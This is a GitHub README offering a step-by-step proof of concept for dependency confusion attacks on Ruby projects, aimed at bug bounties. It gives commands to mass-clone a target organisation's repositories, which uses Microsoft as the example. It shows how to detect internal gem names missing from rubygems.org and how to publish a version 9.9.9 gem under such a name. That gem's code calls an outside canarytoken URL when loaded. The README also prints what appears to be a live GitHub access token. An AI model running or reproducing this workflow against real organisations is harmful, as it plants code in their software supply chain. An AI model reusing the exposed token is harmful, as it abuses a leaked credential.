<h1 align="center">
    <a href="https://www.youtube.com/@techghoshal"><img src="https://github.com/techghoshal/ruby_dependency_confusion_attacks/assets/85815644/be00b3c1-adfb-4027-a23e-910562684b81"></a>
<h1 align="center">Ruby Dependency Confusion Attacks POC
<p align="center"><img alt="Twitter Follow" src="https://img.shields.io/twitter/follow/techghoshal?style=social"></p>
</h1>
  
  
## How to Finds & How to Exploit
    
Finds Gemfile then check the all require here is public or not
    
`https://rubygems.org/gems/`

#### Download all target github repository
 
 - Crate personal access tokens (classic) - https://github.com/settings/tokens 
 - Install ghorg - https://github.com/gabrie30/ghorg#installation
    
 ```bash
$ ghorg clone <target> -t <token>
```
`example: $ ghorg clone microsoft -t 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`
    
- After Download all repository finds vulnerable ruby package 
    
```bash
$ find . -type f -name Gemfile | xargs -n1 -I{} cat {} | awk '/gem / {print}' | grep gem | cut -d "'" -f2 | sort -u | tr -d "'" | tr -d "," |  xargs -n1 -I{} echo "https://rubygems.org/gems/{}" |  httpx -status-code -silent -content-length -mc 404
```
- 404 code means this package not available publicly, so this the vulnerable to dependencies confusion attack.
    
- Then must be cross checking using github dorking - `org:microsoft package_name`
    
- So now Publish this ruby packages publicly (https://rubygems.org)
    
```bash
$ bundle gem <package_name>
```
- Everything set default
    
```bash
$ cd <package_name>
```
```bash
$ nano <package_name>.gem
```
- Replaced -
    
    ```bash
    Gem::Specification.new do |s|
      s.name        = "<package_name>"
      s.version     = "9.9.9"
      s.summary     = "Vulnerability Disclosure: Dependency confiuse vulnerability"
      s.description = "This Ruby package vulnerable to dependency confiuse vulnerability"
      s.authors     = ["<Anindya Ghoshal>"]
      s.email       = "<techghoshal@gmail.com>"
      s.files       = ["lib/<package_name>.rb"]
      s.homepage    =
        "https://rubygems.org/gems/<package_name>"
      s.license       = "MIT"
   end
   ```
 - Save this file
 
 ```bash
 $ cd lib
 ```
 - Replaced -
    
    ```bash
    module Techghoshal
       require 'net/http'
       result = Net::HTTP.get(URI.parse('<canarytokens_url>'))
    end
    ```
 - Save this file  
 
 ```bash
 $ cd ..
 ```
 ```bash
 $ gem build <package_name>.gemspec
 ```
- Upload file publicly (https://rubygems.org/)

- Create Accont on rubygems.org
    
 ```bash
 $ gem push <package_name>-9.9.9.gem 
 ```
- Enter your Email: `<email>`
- Enter your username: `<username>`
- Enter your password: `<password>`
    
---
    
<b>Upload IS DONE</b> 😎 
- Must be checking - https://rubygems.org/gems/package_name
- 🎉 Now Bounty Time 💰💰
 
## Connect me
If you have any queries & how can more improve this repository, you can always contact me on  <a href="https://twitter.com/techghoshal">twitter(@techghoshal)</a>
    
    
